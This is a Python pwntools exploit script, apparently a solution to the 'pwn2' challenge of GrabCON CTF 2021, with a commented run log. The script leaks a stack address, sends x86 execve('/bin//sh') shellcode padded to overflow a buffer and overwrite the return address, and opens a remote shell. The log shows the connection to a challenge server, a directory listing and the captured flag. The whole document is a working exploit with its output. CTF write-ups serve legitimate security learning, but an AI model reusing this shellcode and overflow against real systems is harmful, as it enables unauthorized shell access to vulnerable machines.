from pwn import *

context(os='linux', arch='i386')
#context.log_level = 'debug'

BINARY = './pwn2'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "35.246.42.94"
  PORT = 1337
  s = remote(HOST, PORT)
else:
  s = process(BINARY)

shellcode = "\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"

s.recvuntil("eat some ")

stack_leak = int(s.recvuntil("!")[:-1], 16)
print "stack_leak =", hex(stack_leak)

buf  = shellcode 
buf += "A"*(302 - len(buf))
buf += p32(stack_leak)
s.sendline(buf)

s.sendline("A"*120)

s.interactive()

'''
mito@ubuntu:~/CTF/GrabCON_CTF_2021/Pwn_Pwn_CTF$ python solve.py r
[*] '/home/mito/CTF/GrabCON_CTF_2021/Pwn_Pwn_CTF/pwn2'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
[+] Opening connection to 35.246.42.94 on port 1337: Done
stack_leak = 0xffe623de
[*] Switching to interactive mode

/bin//sh: 1: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA: not found
$ ls -l
total 40
drwxr-x--- 1 0 1000  4096 Sep  2 17:05 bin
drwxr-x--- 1 0 1000  4096 Sep  2 17:05 dev
-rwxr----- 1 0 1000    31 Sep  2 17:04 flag.txt
drwxr-x--- 1 0 1000  4096 Sep  2 17:05 lib
drwxr-x--- 1 0 1000  4096 Sep  2 17:05 lib32
drwxr-x--- 1 0 1000  4096 Sep  2 17:05 lib64
-rwxr-x--- 1 0 1000 13764 Sep  2 17:04 pwn2
$ cat flag.txt
GrabCON{Y0U_g0t_Sh3ll_B4asics}
'''
